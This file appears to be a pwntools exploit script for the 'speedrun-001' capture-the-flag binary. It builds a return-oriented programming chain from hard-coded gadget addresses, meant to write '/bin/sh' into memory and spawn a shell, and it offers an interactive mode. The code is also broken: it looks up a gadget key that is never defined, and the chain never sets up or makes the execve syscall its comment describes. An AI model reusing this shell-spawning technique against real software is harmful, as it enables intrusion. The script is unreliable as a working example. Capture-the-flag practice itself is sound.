#!/usr/bin/python3
import pwn
import sys
binary = "./speedrun-001"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
Exploit:
 use write primitive to write /bin/sh to .data section
 call execve on the .data section 
Pseudo-Code:
 pop rax ret
 data section
 pop rdx ret
 /bin/sh
 mov qword ptr rax rdx
 pop rdi 
 0
'''

padding = 1040
gadgets = {
    "pop_rdi_ret":0x400686,
    "mov_qword_ptr_rax_rdx":0x48d251,
    "pop_rax_ret":0x415664,
    "pop_rdx_ret":0x44be16,
    "data_section":0x6b90e0
}
payload = b"A"*padding
payload = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["pop_rax_ret"]),
    pwn.p64(gadgets["data_section"]),
    pwn.p64(gadgets["pop_rdx_ret"]),
    0x68732f6e69622f,
    pwn.p64(gadgets["mov_qword_ptr_rax_rdx"]),
    pwn.p64(gadgets["pop_rdi"]),
    0
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)
    pwn.info(io.readrepeat(1))
    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
